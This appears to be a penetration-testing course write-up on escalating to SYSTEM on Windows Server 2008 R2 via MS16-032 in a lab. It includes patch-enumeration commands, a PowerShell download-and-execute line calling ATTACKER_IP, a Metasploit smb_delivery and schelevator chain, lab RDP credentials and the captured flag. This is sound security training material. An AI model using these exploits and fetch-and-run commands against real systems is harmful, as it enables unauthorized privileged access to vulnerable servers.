# Section 29 — Windows Server (2008 Case Study)

> **Lab: yes** — RDP to Server 2008 R2, enumerate missing patches, escalate to SYSTEM using MS16-032, read flag.

**Core principle:** Windows Server 2008 R2 lacks modern security features (Credential Guard, Device Guard, AppLocker, enhanced Defender). With minimal patching, it's vulnerable to multiple kernel privilege escalation exploits. Enumerate patch level, pick an exploit, get SYSTEM.

---

## Server 2008 vs modern — missing security features

| Feature | Server 2008 R2 | Server 2016+ |
|---------|----------------|--------------|
| Credential Guard | No | Yes |
| Device Guard | No | Yes |
| AppLocker | Partial | Yes |
| Windows Defender ATP | No | Yes |
| Control Flow Guard | No | Yes |
| Remote Credential Guard | No | Yes |

---

## Enumeration methodology

### Check patch level

```cmd
wmic qfe
```
> Lists all installed hotfixes. Very few KBs = very unpatched = many kernel exploits available.

### systeminfo

```cmd
systeminfo
```
> Confirms OS version, architecture (x64), build number. Server 2008 R2 = Build 7600/7601.

### Sherlock (PowerShell)

```powershell
Set-ExecutionPolicy bypass -Scope process
Import-Module .\Sherlock.ps1
Find-AllVulns
```
> Checks for MS10-015, MS10-092, MS13-053, MS14-058, MS15-051, MS16-032, MS16-135.

### Windows-Exploit-Suggester (from Kali)

```bash
# Save systeminfo output to a file, then:
windows-exploit-suggester.py --database 2021-05-13-mssb.xls --systeminfo sysinfo.txt
```
> Compares patch level against Microsoft vulnerability database.

---

## Common Server 2008 privilege escalation exploits

| CVE | MS Bulletin | Name | Notes |
|-----|-------------|------|-------|
| CVE-2010-3338 | MS10-092 | Task Scheduler XML | Works on x64, Metasploit module available |
| CVE-2015-1701 | MS15-051 | ClientCopyImage Win32k | x86 and x64 |
| CVE-2016-0099 | MS16-032 | Secondary Logon Handle | Reliable on x64, PowerShell script available |
| CVE-2016-7255 | MS16-135 | Win32k Elevation | x64 |

---

## MS16-032 exploitation (without Metasploit)

### Host the exploit from Kali

```bash
python3 -m http.server 8000 --directory /usr/share/powershell-empire/empire/server/data/module_source/privesc/
```
> The Invoke-MS16032.ps1 script is from PowerShell Empire. Located at `/usr/share/powershell-empire/empire/server/data/module_source/privesc/Invoke-MS16032.ps1`.

### Download and execute on target

```powershell
IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP:8000/Invoke-MS16032.ps1')
```

### Run the exploit

```powershell
Invoke-MS16-032 -Cmd "cmd /c type C:\Users\Administrator\Desktop\flag.txt > C:\Users\htb-student\Desktop\flag.txt"
```
> The `-Cmd` parameter (not `-Command`) specifies what to run as SYSTEM. The command executes in a new process, so output won't appear in your current shell. Redirect output to a file you can read.

Then read the flag:

```cmd
type C:\Users\htb-student\Desktop\flag.txt
```

---

## MS16-032 with Metasploit (alternative)

```
# Get initial shell via smb_delivery
use exploit/windows/smb/smb_delivery
set target 0          # DLL
set SRVHOST tun0_IP
set LHOST tun0_IP
exploit -j

# On target: rundll32.exe \\ATTACKER_IP\<share>\test.dll,0

# Migrate to 64-bit process (required)
sessions -i 1
migrate <64-bit PID>    # e.g., conhost.exe, taskhost.exe
background

# Escalate
use exploit/windows/local/ms10_092_schelevator
set SESSION 1
set LHOST tun0_IP
set LPORT 4443
exploit
```
> Must migrate to a 64-bit process first or the exploit fails.

---

## RDP to Server 2008 — connection issues

Server 2008 uses older TLS/RDP security that modern xfreerdp3 may reject.

**If xfreerdp3 fails with TLS handshake errors:**

```bash
# Use rdesktop instead (no clipboard support)
rdesktop -u htb-student -p 'HTB_@cademy_stdnt!' TARGET_IP

# Or xfreerdp3 with legacy security
xfreerdp3 /cert:ignore /dynamic-resolution +clipboard /compression /v:TARGET_IP /u:htb-student /p:'HTB_@cademy_stdnt!' /sec:rdp /tls-seclevel:0
```
> rdesktop works but lacks clipboard — can't copy/paste between Kali and target. Use file transfer (HTTP/SMB) or redirect output to files instead.

---

## Lab walkthrough

**Target:** `<TARGET_IP>` (ACADEMY-WINLPE-2K8)
**RDP Creds:** `htb-student` / `HTB_@cademy_stdnt!`

### Attack chain

```
STEP 1: CONNECT
───────────────
1. RDP to target (use rdesktop if xfreerdp3 fails with TLS error)
   rdesktop -u htb-student -p 'HTB_@cademy_stdnt!' <TARGET_IP>

STEP 2: ENUMERATE
─────────────────
2. Check privileges, OS info, and patch level
   whoami /priv        → No SeImpersonatePrivilege
   systeminfo          → Server 2008 R2 Standard, Build 7600, x64
   wmic qfe            → Only KB2533552 installed (massively unpatched)

STEP 3: ESCALATE WITH MS16-032
──────────────────────────────
3. On Kali, serve the exploit
   python3 -m http.server 8000 --directory /usr/share/powershell-empire/empire/server/data/module_source/privesc/

4. On target (PowerShell), download the exploit
   IEX(New-Object Net.WebClient).DownloadString('http://KALI_TUN0_IP:8000/Invoke-MS16032.ps1')

5. Run the exploit — redirect flag to readable location
   Invoke-MS16-032 -Cmd "cmd /c type C:\Users\Administrator\Desktop\flag.txt > C:\Users\htb-student\Desktop\flag.txt"
   
   → "Holy handle leak Batman, we have a SYSTEM shell!!"
   → The -Cmd parameter runs as SYSTEM in a new process
   → Output goes to the redirected file, not your current shell

6. Read the flag
   type C:\Users\htb-student\Desktop\flag.txt
   → L3gacy_st1ll_pr3valent!
```

---

## Key takeaways

- **Server 2008 R2 is still common internally.** Hospitals, universities, government — expect to see it.
- **Check patch level first:** `wmic qfe` and Sherlock tell you exactly what's exploitable.
- **MS16-032 is the most reliable PowerShell-based privesc** for Server 2008 R2 x64. Use Invoke-MS16032.ps1 from Empire.
- **The `-Cmd` parameter runs in a new SYSTEM process.** Output won't appear in your shell — redirect to a file.
- **rdesktop is the fallback for Server 2008 RDP.** xfreerdp3 fails on old TLS; rdesktop works but has no clipboard.
- **Always check with the client before attacking legacy systems** — they may be fragile and mission-critical.
- **Migrate to a 64-bit process** if using Metasploit on x64 Server 2008, or exploits will fail.
